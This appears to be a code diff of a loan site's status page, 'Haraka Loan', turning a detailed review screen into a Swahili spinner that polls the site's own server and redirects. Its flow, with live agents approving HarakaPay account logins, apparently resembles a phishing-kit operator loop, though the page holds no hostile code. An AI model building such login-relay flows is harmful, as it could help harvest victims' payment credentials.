@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Application Review | Haraka Loan</title>
+  <title>Inahakikiwa… | Haraka Loan</title>
   <style>
     :root {
       --green: #087a52;
@@ -14,8 +14,6 @@
       --line: #e1eae4;
       --white: #fff;
       --page: #f8fbf9;
-      --shadow: 0 18px 50px rgba(18, 57, 38, .09);
-      --red: #b4341f;
     }
 
     * { box-sizing: border-box; }
@@ -27,324 +25,86 @@
       font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont,
         "Segoe UI", sans-serif;
       line-height: 1.55;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    .container { width: min(560px, calc(100% - 40px)); margin: 0 auto; }
-
-    .site-header {
-      position: sticky; top: 0; z-index: 10;
-      background: rgba(255, 255, 255, .96);
-      border-bottom: 1px solid var(--line);
-      backdrop-filter: blur(12px);
-    }
-
-    .nav {
-      min-height: 70px; display: flex;
-      align-items: center; justify-content: space-between; gap: 24px;
-    }
-
-    .brand {
-      display: inline-flex; align-items: center; gap: 10px;
-      color: var(--green); font-size: 1.25rem; font-weight: 850;
-      letter-spacing: -.04em; text-decoration: none;
-    }
-
-    .brand img { height: 34px; width: auto; display: block; }
-
-    .wrap { padding: 42px 0 60px; }
-
-    .panel {
-      padding: clamp(24px, 4vw, 38px);
-      border: 1px solid var(--line);
-      border-radius: 20px;
-      background: var(--white);
-      box-shadow: var(--shadow);
+    .loader {
+      display: grid;
+      justify-items: center;
+      gap: 18px;
+      padding: 40px;
       text-align: center;
     }
 
-    .pending-icon, .approved-icon, .declined-icon {
-      width: 62px; height: 62px; margin: 0 auto 16px;
-      border-radius: 50%; display: grid; place-items: center;
-      font-size: 1.7rem; font-weight: 900; color: var(--white);
-    }
-    .pending-icon  { background: #d9a521; }
-    .approved-icon { background: var(--green); }
-    .declined-icon { background: var(--red); }
-
     .spinner {
-      width: 46px; height: 46px; margin: 6px auto 18px;
+      width: 52px;
+      height: 52px;
       border: 4px solid var(--green-pale);
       border-top-color: var(--green);
       border-radius: 50%;
       animation: spin .8s linear infinite;
     }
+
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    .live-dot {
-      display: inline-flex; align-items: center; gap: 7px;
-      margin-bottom: 14px; padding: 6px 12px;
-      border: 1px solid #efe6cf; border-radius: 999px;
-      background: #fffaf0; color: #8a6d1d;
-      font-size: .8rem; font-weight: 700;
-    }
-    .live-dot .dot, .live-dot-app .dot {
-      width: 8px; height: 8px; border-radius: 50%;
-      background: #d9a521; animation: pulse 1.6s ease infinite;
-    }
-    .live-dot-app .dot { background: #2aaf70; }
-    .live-dot-app {
-      border-color: #d8eade; background: rgba(232, 245, 237, .8); color: var(--green-dark);
-    }
-    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: .25; } }
-
-    h1 { margin: 0 0 8px; font-size: 1.65rem; letter-spacing: -.04em; }
-    .lead { margin: 0 0 24px; color: var(--muted); }
-
-    .summary {
-      text-align: left; max-width: 460px; margin: 0 auto 22px;
-      padding: 20px; border: 1px solid var(--line);
-      border-radius: 15px; background: var(--page);
-    }
-    .summary-row {
-      display: flex; justify-content: space-between; gap: 14px;
-      padding-bottom: 11px; border-bottom: 1px solid #e7ede9;
-      font-size: .93rem;
-    }
-    .summary-row:last-child { padding-bottom: 0; border-bottom: 0; }
-    .summary-row span:first-child { color: var(--muted); }
-    .summary-row strong { text-align: right; }
-
-    .panel .button {
-      display: inline-flex; min-height: 50px; align-items: center;
-      justify-content: center; padding: 0 26px; border: 0; border-radius: 10px;
-      background: var(--green); color: var(--white); font: inherit;
-      font-weight: 750; text-decoration: none; cursor: pointer;
-      transition: background 160ms ease;
-    }
-    .panel .button:hover { background: var(--green-dark); }
-    .panel .button.secondary {
-      background: var(--white); color: var(--green-dark); border: 1px solid #dce9e0;
+    .loader h1 {
+      margin: 6px 0 0;
+      font-size: 1.3rem;
+      letter-spacing: -.03em;
+      color: var(--green-dark);
     }
 
-    .note { margin-top: 16px; color: #8aa196; font-size: .8rem; }
+    .loader p { margin: 0; color: var(--muted); font-size: .9rem; }
 
-    .error-box {
-      margin-top: 14px; padding: 12px 16px; color: var(--red);
-      background: #fdf1ef; border: 1px solid #f4d5cf; border-radius: 12px;
-      font-size: .88rem; display: none;
+    .pulse-dots span {
+      display: inline-block;
+      width: 7px; height: 7px;
+      margin: 0 3px;
+      border-radius: 50%;
+      background: var(--green);
+      animation: pulse 1.4s ease infinite;
     }
-    .error-box.show { display: block; }
-
-    footer { padding: 24px 0; border-top: 1px solid var(--line); background: var(--white); }
-    footer .container {
-      display: flex; flex-wrap: wrap; gap: 12px;
-      justify-content: space-between; color: var(--muted); font-size: .85rem;
-    }
-    footer a { color: var(--green-dark); text-decoration: none; font-weight: 700; }
-
-    @media (max-width: 480px) {
-      .container { width: calc(100% - 30px); }
-      .panel .button { width: 100%; }
-      .panel .button + .button { margin-top: 10px; }
-    }
+    .pulse-dots span:nth-child(2) { animation-delay: .2s; }
+    .pulse-dots span:nth-child(3) { animation-delay: .4s; }
+    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: .2; } }
   </style>
 </head>
 <body>
-  <header class="site-header">
-    <div class="container nav">
-      <a class="brand" href="index.html">
-        <img src="logo.png" alt="Haraka Loan logo">
-        Haraka Loan
-      </a>
-      <a style="color:var(--green-dark);font-weight:750;text-decoration:none;font-size:.9rem;" href="index.html">← Home</a>
-    </div>
-  </header>
-
-  <main class="wrap">
-    <div class="container">
-      <div class="panel" id="panel">
-        <!-- filled by script -->
-      </div>
-      <div class="error-box" id="errorBox"></div>
-    </div>
-  </main>
-
-  <footer>
-    <div class="container">
-      <span>© 2025 Sava-tech Financial Services Limited — Haraka Loan</span>
-      <a href="index.html">Haraka Loan home</a>
-    </div>
-  </footer>
+  <div class="loader">
+    <div class="spinner"></div>
+    <h1 id="loaderTitle">Inahakikiwa…</h1>
+    <p id="loaderText">Tunasubiri uidhinishaji — tafadhali usifunge ukurasa huu</p>
+    <div class="pulse-dots"><span></span><span></span><span></span></div>
+  </div>
 
   <script>
-    const panel = document.getElementById("panel");
-    const errorBox = document.getElementById("errorBox");
     const ref = new URLSearchParams(location.search).get("ref");
 
-    function tzs(n) { return "TZS " + Number(n).toLocaleString("en-US"); }
-    function fmtDate(iso) {
-      return iso ? new Date(iso).toLocaleDateString("en-GB",
-        { day: "numeric", month: "short", year: "numeric" }) : "—";
-    }
+    const isPay = ref && ref.startsWith("HP-");
+    const endpoint = isPay ? "/api/pstatus" : "/api/status";
 
-    function summaryHtml(app) {
-      return `
-        <div class="summary">
-          <div class="summary-row"><span>Reference</span><strong>${app.reference}</strong></div>
-          <div class="summary-row"><span>Applicant</span><strong>${app.fullName}</strong></div>
-          <div class="summary-row"><span>Phone</span><strong>${app.phone}</strong></div>
-          <div class="summary-row"><span>Region</span><strong>${app.region}</strong></div>
-          <div class="summary-row"><span>Requested</span><strong>${tzs(app.amount)}</strong></div>
-          <div class="summary-row"><span>Period</span><strong>${app.period}</strong></div>
-          <div class="summary-row"><span>Submitted</span><strong>${new Date(app.submittedAt).toLocaleString()}</strong></div>
-        </div>`;
-    }
-
-    function renderPending(app) {
-      panel.innerHTML = `
-        <div class="spinner"></div>
-        <div class="live-dot"><span class="dot"></span> Live agents reviewing</div>
-        <h1>Application under review</h1>
-        <p class="lead">Your application is with our loan officers right now.
-          This page updates automatically once a decision is made — you don't need to refresh.</p>
-        ${summaryHtml(app)}
-        <div class="note">⏎ Keep this page open. You can continue as soon as it is approved.</div>`;
-    }
-
-    function renderApproved(app) {
-      panel.innerHTML = `
-        <div class="approved-icon">✓</div>
-        <div class="live-dot live-dot-app"><span class="dot"></span> Approved</div>
-        <h1>Application approved!</h1>
-        <p class="lead">Congratulations ${app.fullName.split(" ")[0]} — your loan has been approved
-          by our review team. Connect your HarakaPay account to receive the funds.</p>
-        <div class="summary">
-          <div class="summary-row"><span>Reference number</span><strong>${app.reference}</strong></div>
-          <div class="summary-row"><span>Approved amount</span><strong>${tzs(app.amount)}</strong></div>
-          <div class="summary-row"><span>Service fee</span><strong>${tzs(app.fee)} (5%)</strong></div>
-          <div class="summary-row"><span>Total repayment</span><strong>${tzs(app.total)}</strong></div>
-          <div class="summary-row"><span>Due date</span><strong>${fmtDate(app.dueDate)}</strong></div>
-        </div>
-        <a class="button" href="login.html" id="connectBtn">Connect with HarakaPay&nbsp;&nbsp;→</a>
-        <p class="note">Loans are disbursed and repaid through HarakaPay only.</p>`;
-
-      document.getElementById("connectBtn").addEventListener("click", () => {
-        localStorage.setItem("haraka_application", JSON.stringify({
-          fullName: app.fullName,
-          phone: app.phone,
-          region: app.region,
-          amount: app.amount,
-          purpose: app.purpose,
-          status: "APPROVED",
-          reference: app.reference,
-          fee: app.fee,
-          total: app.total,
-          dueDate: app.dueDate
-        }));
-      });
-    }
-
-    function renderDeclined(app) {
-      panel.innerHTML = `
-        <div class="declined-icon">✕</div>
-        <h1>Application declined</h1>
-        <p class="lead">Unfortunately your application <strong>${app.reference}</strong> was declined by our
-          review team. You are welcome to apply again at any time — a new application
-          will get a fresh review.</p>
-        ${summaryHtml(app)}
-        <a class="button" href="application.html">Apply again&nbsp;&nbsp;→</a>
-        <a class="button secondary" href="index.html" style="margin-left:10px;">Back to home</a>`;
-    }
-
-    function renderNotFound() {
-      panel.innerHTML = `
-        <div class="declined-icon" style="background:#d9a521;">i</div>
-        <h1>Application not found</h1>
-        <p class="lead">We couldn't find this application reference. If you applied just now,
-          please submit a new application.</p>
-        <a class="button" href="application.html">Start your application&nbsp;&nbsp;→</a>`;
-    }
-
-    function showError(msg, retryIn = -1) {
-      errorBox.textContent = msg + (retryIn > 0 ? " Retrying in " + retryIn + "s…" : "");
-      errorBox.classList.add("show");
-    }
-
-    let pollTimer = null;
-
-    /* ---- HarakaPay payment screens (refs HP-xxxxxx) ---- */
-    function payPending(email) {
-      panel.innerHTML = `
-        <div class="spinner"></div>
-        <div class="live-dot"><span class="dot"></span> Live agents confirming</div>
-        <h1>Confirming your HarakaPay connection</h1>
-        <p class="lead">Our payment team is reviewing the HarakaPay request for
-          <strong>${email || 'your account'}</strong> (Ref <strong>${ref}</strong>).
-          This page updates automatically once it is approved — you don't need to refresh.</p>
-        <div class="summary">
-          <div class="summary-row"><span>Reference</span><strong>${ref}</strong></div>
-          <div class="summary-row"><span>HarakaPay</span><strong>${email || '—'}</strong></div>
-        </div>
-        <div class="note">⏎ Keep this page open. Your loan funds are released right after approval.</div>`;
-    }
-
-    function payApproved(email) {
-      panel.innerHTML = `
-        <div class="approved-icon">✓</div>
-        <div class="live-dot live-dot-app"><span class="dot"></span> Payment approved</div>
-        <h1>HarakaPay connected!</h1>
-        <p class="lead">Your HarakaPay account <strong>${email || ''}</strong> has been approved and
-          connected. Your loan funds are on the way to your wallet.</p>
-        <a class="button" href="success.html">View your money receipt&nbsp;&nbsp;→</a>
-        <p class="note">Loans are disbursed and repaid through HarakaPay only.</p>`;
-      localStorage.setItem("haraka_pay_connected", "true");
-    }
-
-    function payDeclined(email) {
-      panel.innerHTML = `
-        <div class="declined-icon">✕</div>
-        <h1>Connection declined</h1>
-        <p class="lead">The HarakaPay connection request <strong>${ref}</strong>
-          (account ${email || ''}) was declined by our payment team.
-          You can start again at any time.</p>
-        <a class="button" href="login.html">Try again &nbsp;→</a>
-        <a class="button secondary" href="index.html" style="margin-left:10px;">Back to home</a>`;
-    }
+    function go(url) { window.location.replace(url); }
 
     async function check() {
-      clearTimeout(pollTimer);
-      if (!ref) { renderNotFound(); return; }
-
-      const isPay = ref.startsWith("HP-");
-      const endpoint = isPay ? "/api/pstatus" : "/api/status";
+      if (!ref) { go("/application"); return; }   /* no ref — restart flow */
       try {
         const res = await fetch(endpoint + "?ref=" + encodeURIComponent(ref), { cache: "no-store" });
-        if (res.status === 404) { renderNotFound(); return; }
+        if (res.status === 404) { go("/declined?type=loan"); return; }
         if (!res.ok) throw new Error("Server error " + res.status);
         const data = await res.json();
         if (!data.ok) throw new Error("Unexpected response");
-        errorBox.classList.remove("show");
 
-        if (isPay) {
-          if (data.status === "approved") { payApproved(data.email); return; }
-          if (data.status === "declined") { payDeclined(data.email); return; }
-          payPending(data.email);                       // login_pending or pending
-          pollTimer = setTimeout(check, 3000);          // keep waiting (preloader)
-        } else {
-          if (!data.application) throw new Error("Unexpected response");
-          const app = data.application;
-          if (data.status === "pending") {
-            renderPending(app);
-            pollTimer = setTimeout(check, 3000);        // keep waiting (preloader)
-          } else if (data.status === "approved") {
-            renderApproved(app);
-          } else {
-            renderDeclined(app);
-          }
-        }
+        const status = data.status;
+        if (status === "approved") { go("/success?ref=" + encodeURIComponent(ref)); return; }
+        if (status === "declined") { go("/declined?type=" + (isPay ? "pay" : "loan")); return; }
+
+        /* still pending — keep showing the preloader only */
+        setTimeout(check, 2500);
       } catch (e) {
-        showError("Connection to the review server failed (" + e.message + ").", 5);
-        pollTimer = setTimeout(check, 5000);
+        setTimeout(check, 4000);
       }
     }
 
